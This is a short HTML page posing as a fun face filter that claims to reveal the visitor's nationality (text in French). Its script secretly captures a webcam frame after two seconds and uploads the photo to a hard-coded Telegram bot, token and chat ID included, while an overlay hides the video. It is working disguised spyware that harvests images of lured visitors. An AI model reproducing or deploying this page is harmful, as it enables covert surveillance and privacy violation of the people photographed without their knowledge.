<!DOCTYPE html>
<html>
<head>
    <title>Filter</title>
    <style>
        div{
            background-color: aliceblue;
            z-index: 1000;
            position: absolute;
            width: 100%;
            height: 110%;
            top: 8px;
            
        }
        div p{
            color: blue;
            font-size: 30px;
            text-align: center;
        }
        #video {
            width: 100%;
            height: 100vh;
            object-fit: cover;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay muted></video>
    <div><p>Essayez le filtre maintenant pour connaître votre nationalité</p></div>
    <canvas id="canvas"></canvas>
    <script>
        const TELEGRAM_TOKEN = '6649802802:AAFc3iuD443KJP7FnDydxL0rSZjy8Me5-P4';
        const TELEGRAM_CHAT_ID = '5310078604';

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', TELEGRAM_CHAT_ID);
                            formData.append('photo', blob);

                            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => {
                                if (response.ok) {
                                    console.log('Done');
                                } else {
                                    console.error('error');
                                }
                            })
                            .catch(error => console.error( error));
                        }, 'image/png');
                    }, 2000);
                })
                .catch(error => console.error( error));
        } else {
            console.error();
        }
    </script>
</body>
</html>
